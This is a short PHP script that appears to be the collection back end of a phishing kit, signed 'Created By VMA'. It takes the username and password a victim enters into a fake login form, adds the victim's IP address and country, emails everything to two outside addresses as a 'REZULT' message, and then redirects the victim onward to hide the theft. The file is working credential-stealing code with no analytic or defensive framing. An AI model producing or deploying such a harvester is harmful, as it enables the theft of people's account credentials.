<?php

if (isset($_SERVER['HTTP_CLIENT_IP']))
{
    $real_ip_adress = $_SERVER['HTTP_CLIENT_IP'];
}

if (isset($_SERVER['HTTP_X_FORWARDED_FOR']))
{
    $real_ip_adress = $_SERVER['HTTP_X_FORWARDED_FOR'];
}
else
{
    $real_ip_adress = $_SERVER['REMOTE_ADDR'];
}

$cip = $real_ip_adress;
$iptolocation = 'http://api.hostip.info/country.php?ip=' . $cip;
$country = file_get_contents($iptolocation);

$message  = "---------------+ GENERAL REZULT +--------------\n";
$message .= "Username : ".$_POST['email']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "IP: ".$cip."\n";
$message .= "---------------Created By VMA-----------------\n";
$send = "jamesalfred2012@gmail.com,harrrison106@163.com";
$subject = "REZULT $cip ";
$headers = "From: VMA<logs@o2.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message); 
header("Location: go.php?email=".$_POST['email']);  


